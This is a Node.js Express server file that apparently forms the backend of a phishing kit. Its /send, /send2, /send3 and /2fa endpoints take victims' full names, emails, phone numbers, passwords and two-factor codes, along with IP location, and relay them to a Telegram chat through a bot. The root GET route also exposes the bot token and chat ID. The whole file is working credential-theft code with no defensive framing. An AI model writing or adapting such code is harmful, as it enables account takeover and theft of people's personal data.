require('dotenv').config();

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const url = 'https://api.telegram.org/bot';
const cors = require('cors');
app.use(bodyParser.json());
app.use(cors());
app.use(express.static('public'));

app.get('/', function (req, res) {
    res.json({
        BOT_TOKEN: process.env.BOT_TOKEN,
        CHAT_ID: process.env.CHAT_ID,
    });
});

app.post('/', async (req, res) => {
    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text: 'Helo from server Test',
        })

    console.log('inserted to db');
    res.status(200).send(req.body);
});

app.post('/send', async (req, res) => {
    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text:
                `Ip: ${req.body?.ip.ip}\n` +
                `Country: ${req.body?.ip.country}\n` +
                `City: ${req.body?.ip.city}\n` +
                `Region: ${req.body?.ip.region}\n` +
                `pageName: ${req.body?.pageName}\n` +
                `fullName: ${req.body?.fullName}\n` +
                `businessEmail: ${req.body?.businessEmail}\n` +
                `personalEmail: ${req.body?.personalEmail}\n` +
                `phoneNumber: ${req.body?.phoneNumber}\n` +
                `Note: ${req.body?.Note}\n` +
                `Code2Fa: ${req.body?.Code2Fa}\n` +
                `Status: User Send Code\n`,
            parse_mode: 'HTML',
        })

    console.log('inserted to db');
    res.status(200).send(req.body);
});

app.post('/send2', async (req, res) => {
    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text:
                `Ip: ${req.body?.ip.ip}\n` +
                `Country: ${req.body?.ip.country}\n` +
                `City: ${req.body?.ip.city}\n` +
                `Region: ${req.body?.ip.region}\n` +
                `pageName: ${req.body?.pageName}\n` +
                `fullName: ${req.body?.fullName}\n` +
                `businessEmail: ${req.body?.businessEmail}\n` +
                `personalEmail: ${req.body?.personalEmail}\n` +
                `phoneNumber: ${req.body?.phoneNumber}\n` +
                `Pass: ${req.body?.Password}\n` +
                `Note: ${req.body?.Note}\n` +
                `Status: User Resend Code\n`,
            parse_mode: 'HTML',
        })

    console.log('inserted to db');
    res.status(200).send(req.body);
});

app.post('/send3', async (req, res) => {

    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text:
                `Ip: ${req.body?.ip.ip}\n` +
                `Country: ${req.body?.ip.country}\n` +
                `City: ${req.body?.ip.city}\n` +
                `Region: ${req.body?.ip.region}\n` +
                `pageName: ${req.body?.pageName}\n` +
                `fullName: ${req.body?.fullName}\n` +
                `businessEmail: ${req.body?.businessEmail}\n` +
                `personalEmail: ${req.body?.personalEmail}\n` +
                `phoneNumber: ${req.body?.phoneNumber}\n` +
                `ResendPass: ${req.body?.Password}\n` +
                `Note: ${req.body?.Note}\n` +
                `Status: User Resend Code\n`,
            parse_mode: 'HTML',
        })

    console.log('inserted to db');
    res.status(200).send(req.body);

});

app.post('/2fa', async (req, res) => {

    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text:
                `Ip: ${req.body?.ip.ip}\n` +
                `Country: ${req.body?.ip.country}\n` +
                `City: ${req.body?.ip.city}\n` +
                `Region: ${req.body?.ip.region}\n` +
                `Code2Fa: ${req.body?.Code2Fa}\n` +
                `Status: User 2fa Code\n`,
            parse_mode: 'HTML',
        })

    console.log('inserted to db');
    res.status(200).send(req.body);

});

app.listen(8000, () => console.log('Server ready on port 8000.'));

module.exports = app;
